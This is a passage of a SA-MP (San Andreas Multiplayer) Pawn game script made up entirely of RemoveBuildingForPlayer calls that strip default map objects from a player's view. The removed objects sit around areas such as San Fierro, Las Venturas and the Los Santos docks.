	RemoveBuildingForPlayer(playerid, 3675, 254.6797, 1464.6328, 22.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3674, 247.5547, 1471.0938, 35.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 255.5313, 1472.9766, 19.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 252.8125, 1473.8281, 11.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 252.1250, 1473.8906, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 18527, -2100.2188, -2285.5000, 33.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 18200, -2100.2188, -2285.5000, 33.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 18620, -2100.2188, -2285.5000, 33.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 10765, -1144.7109, 347.9375, 13.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, -1174.4297, -479.6641, 25.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, -1135.6172, -295.7813, 25.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 10938, -1909.5547, 497.2188, 25.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 11144, -1909.5547, 497.2188, 25.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 792, -1995.4766, 298.0859, 34.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 1615, -1966.8984, 252.1484, 43.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 1468, 2522.1016, -1665.6484, 15.3281, 0.25);
	RemoveBuildingForPlayer(playerid, 17971, 2484.5313, -1667.6094, 21.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 11321, -1947.2188, 280.8203, 45.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 296.3984, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1957.2344, 297.8672, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 302.8594, 36.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 302.8594, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 299.8672, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1962.4688, 303.1563, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 306.7891, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 303.3281, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 625, -1960.8438, 305.3516, 35.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 303.1563, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 303.1563, 38.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.3047, 306.9297, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.1953, 303.6563, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.7500, 307.0938, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.4141, 304.8906, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1952.8672, 307.1719, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 254.8438, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1957.3516, 254.7578, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1615, -1966.8984, 252.1484, 43.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1947.1953, 253.1094, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1943.2422, 256.9609, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 1616, -1940.5703, 250.8281, 45.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 258.7734, 36.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 258.7734, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1941.5391, 258.7734, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 258.3047, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 259.6406, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1962.4688, 259.6406, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 259.6406, 38.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 261.7734, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 271.9141, 36.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 271.9141, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1962.4688, 270.5156, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 268.6953, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 265.2344, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 625, -1960.8438, 264.7578, 35.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1957.6094, 268.1875, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 270.5156, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 270.5156, 38.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1941.7969, 265.3750, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1941.5391, 271.9141, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 272.1563, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 275.6250, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 625, -1960.8438, 277.5859, 35.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1949.1953, 276.1719, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.6406, 275.9219, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1948.8828, 276.0703, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 285.0625, 36.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3851, -1965.2188, 285.0625, 42.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1962.4688, 281.3984, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 286.0078, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 282.5469, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 279.0859, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1962.4688, 292.2734, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 292.9375, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1959.3750, 289.4766, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1953.5313, 279.2813, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.6016, 278.3594, 34.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 11317, -1947.2188, 280.8203, 45.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 281.3984, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1953.5313, 282.7500, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1957.9219, 284.0859, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1953.5313, 286.2109, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3850, -1951.7969, 287.9453, 40.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 632, -1950.5313, 289.2734, 40.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 292.2734, 44.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 957, -1951.9531, 292.2734, 38.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3785, -1921.7813, 278.7031, 23.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 311.1328, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 338.0078, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 323.0078, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 349.8750, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 284.2656, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 284.2656, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 296.1406, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 296.1406, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 284.2656, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 284.2656, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 323.0078, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 349.8750, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 338.0078, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 311.1328, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 5156, 2838.0391, -2423.8828, 10.9609, 0.25);
	RemoveBuildingForPlayer(playerid, 5159, 2838.0313, -2371.9531, 7.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 5160, 2829.9531, -2479.5703, 5.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 5161, 2838.0234, -2358.4766, 21.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 5162, 2838.0391, -2423.8828, 10.9609, 0.25);
	RemoveBuildingForPlayer(playerid, 5163, 2838.0391, -2532.7734, 17.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 5164, 2838.1406, -2447.8438, 15.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 5165, 2838.0313, -2520.1875, 18.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 5166, 2829.9531, -2479.5703, 5.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 5167, 2838.0313, -2371.9531, 7.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3689, 2685.3828, -2366.0547, 19.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 3689, 2430.5859, -2583.9453, 20.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3707, 2716.2344, -2452.5938, 20.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3707, 2720.3203, -2530.9141, 19.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 3707, 2480.8594, -2460.0547, 20.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3707, 2539.1797, -2424.3594, 20.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3690, 2685.3828, -2366.0547, 19.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 3690, 2430.5859, -2583.9453, 20.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3688, 2387.8047, -2580.8672, 17.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 3688, 2450.8750, -2680.4531, 17.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 3687, 2503.5391, -2366.5078, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3687, 2475.2578, -2394.7891, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3687, 2450.5078, -2419.5391, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3686, 2464.3047, -2617.0156, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3710, 2788.1563, -2417.7891, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3710, 2788.1563, -2455.8828, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3710, 2788.1563, -2493.9844, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2511.9609, -2608.0156, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2511.9609, -2571.2422, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2511.9609, -2535.4531, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2660.4766, -2429.2969, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2639.5469, -2429.2969, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2618.8594, -2429.2969, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3708, 2720.3203, -2530.9141, 19.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 3708, 2716.2344, -2452.5938, 20.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3708, 2480.8594, -2460.0547, 20.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3708, 2539.1797, -2424.3594, 20.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3710, 2415.4609, -2468.5781, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2771.0703, -2372.4453, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2789.2109, -2377.6250, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2774.7969, -2386.8516, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2771.0703, -2520.5469, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2774.7969, -2534.9531, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2437.2109, -2490.0938, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2399.4219, -2490.6797, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2391.8750, -2503.5078, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2551.5313, -2472.6953, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2544.2500, -2524.0938, 16.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 3709, 2544.2500, -2548.8125, 16.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2814.2656, -2356.5703, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2814.2656, -2521.4922, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2568.4453, -2483.3906, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2563.1563, -2563.5781, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2531.7031, -2629.2266, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2519.8047, -2701.8750, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2381.1016, -2701.8750, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 5325, 2488.9922, -2509.2578, 18.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2422.7031, -2411.9219, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2472.4453, -2362.9375, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3758, 2368.1641, -2523.8672, 3.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 5335, 2829.9531, -2479.5703, 5.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 5336, 2829.9531, -2479.5703, 5.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 3770, 2795.8281, -2394.2422, 14.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3770, 2746.4063, -2453.4844, 14.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 3770, 2507.3672, -2640.0703, 14.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 3769, 2464.1250, -2571.6328, 15.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 3769, 2400.9063, -2577.3359, 15.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 5352, 2838.1953, -2488.6641, 29.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2381.1016, -2701.8750, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2406.5469, -2695.0156, 26.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2387.0547, -2667.7422, 16.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2392.1172, -2653.5625, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2386.8438, -2653.5078, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2397.3984, -2653.6250, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2402.6719, -2653.6406, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2407.9453, -2653.6484, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2376.3281, -2630.0000, 26.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2410.9766, -2632.8750, 16.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2376.3281, -2575.8750, 26.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3753, 2368.1641, -2523.8672, 3.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3621, 2387.8047, -2580.8672, 17.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2391.8750, -2503.5078, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3625, 2400.9063, -2577.3359, 15.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2410.9766, -2562.8516, 16.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2410.9766, -2535.2422, 16.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2399.4219, -2490.6797, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3624, 2415.4609, -2468.5781, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2519.8047, -2701.8750, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2492.2031, -2695.0156, 26.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3621, 2450.8750, -2680.4531, 17.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2478.6016, -2662.3828, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2424.2969, -2658.9844, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2430.5781, -2653.9453, 23.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2450.0156, -2632.7734, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2469.6016, -2645.3203, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2470.1406, -2628.2656, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3626, 2507.3672, -2640.0703, 14.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2531.7031, -2629.2266, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3627, 2464.3047, -2617.0156, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2450.0156, -2604.9297, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2469.6016, -2579.9844, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3625, 2464.1250, -2571.6328, 15.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2489.3516, -2625.7109, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2498.3438, -2612.6563, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2496.5547, -2585.1797, 13.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2489.3516, -2566.2734, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2501.8359, -2585.2422, 13.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2511.8359, -2622.6172, 17.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2511.9609, -2608.0156, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2511.9609, -2571.2422, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2450.0156, -2563.2188, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2496.5547, -2557.3359, 13.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 2501.8359, -2557.3984, 13.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2498.3438, -2547.3203, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2470.2734, -2539.0234, 26.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2450.0156, -2535.5703, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2480.3281, -2536.4375, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2470.1406, -2530.5547, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2469.6016, -2514.6484, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2435.8203, -2512.4844, 16.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2437.2109, -2490.0938, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2498.3438, -2481.9766, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2471.5859, -2494.0703, 15.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2444.3281, -2435.0625, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2461.9141, -2444.3438, 16.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2526.4297, -2561.3047, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2544.2500, -2548.8125, 16.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2511.9609, -2535.4531, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2544.2500, -2524.0938, 16.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2533.3906, -2514.1094, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2528.4844, -2508.3047, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2533.6172, -2461.6875, 26.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2551.5313, -2472.6953, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2563.1563, -2563.5781, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2568.4453, -2483.3906, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2624.3281, -2452.1484, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2459.3359, -2427.8281, 16.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 3622, 2450.5078, -2419.5391, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2468.8594, -2413.5234, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2482.2031, -2412.1094, 16.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2422.7031, -2411.9219, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2502.3281, -2404.0781, 16.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2483.7188, -2403.3438, 16.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2455.0703, -2399.0156, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3622, 2475.2578, -2394.7891, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2491.7031, -2383.3281, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2495.8438, -2386.9375, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2472.4453, -2362.9375, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3622, 2503.5391, -2366.5078, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2546.0469, -2396.5938, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2535.6875, -2377.6563, 16.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2512.0078, -2375.0859, 16.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2513.0000, -2339.3281, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2571.1641, -2421.1328, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2592.4922, -2359.4219, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2618.8594, -2429.2969, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2624.3281, -2409.5625, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2626.2344, -2391.5234, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2674.5234, -2557.4922, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2669.9063, -2518.6641, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2674.2656, -2508.3047, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2713.0625, -2508.3047, 16.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 1315, 2672.5938, -2506.8594, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1315, 2680.8594, -2493.0781, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1635, 2704.3672, -2487.8672, 20.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2742.2656, -2481.5156, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2696.0234, -2474.8594, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2675.5703, -2466.8516, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 5326, 2661.5156, -2465.1406, 20.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2669.9063, -2447.2891, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2696.0234, -2446.6250, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2639.5469, -2429.2969, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3623, 2660.4766, -2429.2969, 17.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 2629.2109, -2419.6875, 12.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 2649.8984, -2419.6875, 12.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 1315, 2686.7578, -2416.6250, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2663.5078, -2409.5625, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1315, 2672.5938, -2408.2500, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2742.2656, -2416.5234, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2639.1953, -2392.8203, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2663.8359, -2392.8203, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2637.1719, -2385.8672, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1306, 2669.9063, -2394.5078, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2692.6797, -2387.4766, 16.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2708.4063, -2391.5234, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2774.7969, -2534.9531, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2771.0703, -2520.5469, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2501.8359, 14.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 3624, 2788.1563, -2493.9844, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2486.9609, 14.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 3578, 2747.0078, -2480.2422, 13.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2463.8203, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2773.3438, -2479.9688, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3624, 2788.1563, -2455.8828, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3626, 2746.4063, -2453.4844, 14.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2448.4766, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2773.3438, -2443.1719, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3577, 2744.5703, -2436.1875, 13.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 3577, 2744.5703, -2427.3203, 13.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2425.3516, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2774.7969, -2386.8516, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2771.0703, -2372.4453, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2410.2109, 14.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3624, 2788.1563, -2417.7891, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2802.4297, -2556.5234, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2501.8359, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2797.5156, -2486.8281, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2486.9609, 14.6328, 0.25);
